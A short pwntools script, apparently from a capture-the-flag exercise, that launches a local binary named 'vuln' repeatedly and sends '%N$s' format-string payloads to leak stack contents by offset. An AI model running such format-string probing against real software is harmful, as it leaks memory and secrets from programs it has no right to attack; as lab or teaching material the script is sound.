#!/usr/bin/env python

from pwn import *

context.log_level = 'error'

for i in range(1000):
	p = process('./vuln')
	p.recv()
	try:
		p.sendline('%'+str(i)+'$s')
		p.recvuntil('\n\n')
		print (p.recv(), i)
		p.close()
	except:
		p.close()